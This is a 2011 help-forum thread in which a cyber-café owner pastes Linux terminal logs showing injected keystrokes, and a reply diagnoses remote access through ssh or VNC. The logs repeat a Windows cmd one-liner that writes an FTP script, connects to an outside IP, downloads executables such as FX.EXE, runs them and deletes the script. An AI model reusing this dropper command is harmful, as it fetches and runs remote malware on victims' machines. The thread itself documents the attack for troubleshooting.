---
title: "HELP ME !! Possible virus (Usuario NOVATO)"
date: 2011-05-30
forum: General Help
---

### Post by edwardfb on 2011-05-30
[U]eso aparecio en mi pc, yo tengo un cyber-cafe y frecuentemente aparece esto en todas las computadoras. El teclado empieza a ejecutarse solo, a veces, se abre Firefox, o Chrome o el Terminal... 

DATOS ADICIONALES: Tengo corriendo Crossover Pro v.9 con Suite MS Office[/U]



[B]that appeared on my pc, I have a cyber-cafe and it often appears on all computers. The keyboard starts to run alone, sometimes, open Firefox or Chrome or Terminal ...

ADDITIONAL INFORMATION: I have run Crossover Pro v.9 with MS Office Suite
[/B]



usuario@pc04linux:~$ %SYSTEMROOT%\SYSTEM32\CMD.EXE
bash: fg: %SYSTEMROOT%SYSTEM32CMD.EXE: no existe ese trabajo
usuario@pc04linux:~$ CMD /C ECHO OPEN 201.211.178.55 50708 >> IK &ECHO USER UP DATE >> IK &ECHO GET FX.EXE >> IK &ECHO BYE >> IK &FTP -N -V -S:IK &DEL IK &FX.EXE &EXIT
[1] 3076
[2] 3077
[3] 3078
[4] 3079
[5] 3080
[6] 3081
[7] 3083
DEL: command not found
ECHO: command not found
EXIT: command not found
[4]   Salida 127              ECHO BYE >> IK
[6]-  Salida 127              DEL IK
usuario@pc04linux:~$ CMD: command not found
El programa «FTP» no está instalado actualmente.  Puede instalarlo escribiendo:
sudo apt-get install ftp.app
FX.EXE: command not found
ECHO: command not found
ECHO: command not found

[1]   Salida 127              CMD /C ECHO OPEN 201.211.178.55 50708 >> IK
[2]   Salida 127              ECHO USER UP DATE >> IK
[3]   Salida 127              ECHO GET FX.EXE >> IK
[5]-  Salida 127              FTP -N -V -S:IK
[7]+  Salida 127              FX.EXE
usuario@pc04linux:~$ 
usuario@pc04linux:~$ 7~
7~: command not found
usuario@pc04linux:~$ 
usuario@pc04linux:~$ %SYSTEMROOT%\SYSTEM32\CMD.EXE
bash: fg: %SYSTEMROOT%SYSTEM32CMD.EXE: no existe ese trabajo
usuario@pc04linux:~$ CMD /C ECHO OPEN 201.211.178.55 50708 >> IK &ECHO USER UP DATE >> IK &ECHO GET YX.EXE >> IK &ECHO BYE >> IK &FTP -N -V -S:IK &DEL IK &YX.EXE &EXIT
[1] 3174
[2] 3175
[3] 3176
[4] 3177
[5] 3179
[6] 3180
[7] 3181
El programa «FTP» no está instalado actualmente. DEL: command not found
ECHO: command not found
EXIT: command not found
ECHO: command not found
 Puede instalarlo escribiendo:
sudo apt-get install ftp.app
CMD: command not found
ECHO: command not found
YX.EXE: command not found
[5]   Salida 127              FTP -N -V -S:IK
[6]-  Salida 127              DEL IK
usuario@pc04linux:~$ 
[1]   Salida 127              CMD /C ECHO OPEN 201.211.178.55 50708 >> IK
[2]   Salida 127              ECHO USER UP DATE >> IK
[3]   Salida 127              ECHO GET YX.EXE >> IK
[4]-  Salida 127              ECHO BYE >> IK
[7]+  Salida 127              YX.EXE
usuario@pc04linux:~$ 
usuario@pc04linux:~$ 7~
7~: command not found
usuario@pc04linux:~$ 
usuario@pc04linux:~$ %SYSTEMROOT%\SYSTEM32\CMD.EXE
bash: fg: %SYSTEMROOT%SYSTEM32CMD.EXE: no existe ese trabajo
usuario@pc04linux:~$ CMD /C ECHO OPEN 201.211.178.55 50708 >> IK &ECHO USER UP DATE >> IK &ECHO GET OI.EXE >> IK &ECHO BYE >> IK &FTP -N -V -S:IK &DEL IK &OI.EXE &EXIT
[1] 3394
[2] 3395
[3] 3396
[4] 3397
[5] 3399
[6] 3400
[7] 3401
CMD: command not found
EXIT: command not found
ECHO: command not found
El programa «FTP» no está instalado actualmente. ECHO: command not found
 Puede instalarlo escribiendo:
sudo apt-get install ftp.app
DEL: command not found
usuario@pc04linux:~$ ECHO: command not found
OI.EXE: command not found

[1]   Salida 127              CMD /C ECHO OPEN 201.211.178.55 50708 >> IK
[2]   Salida 127              ECHO USER UP DATE >> IK
[3]   Salida 127              ECHO GET OI.EXE >> IK
[4]   Salida 127              ECHO BYE >> IK
[5]   Salida 127              FTP -N -V -S:IK
[6]-  Salida 127              DEL IK
[7]+  Salida 127              OI.EXE
usuario@pc04linux:~$

---

### Post by Joe of loath on 2011-05-30
Looks like some script kiddie is trying to run Windows exploits on your boxes. The exploits themselves you don't have to worry about, but how they go there you do. Do you have ssh access enabled? How locked down is the default user?

EDIT: I have seen this particular stuff before in another forum post, do you have VNC enabled?

---

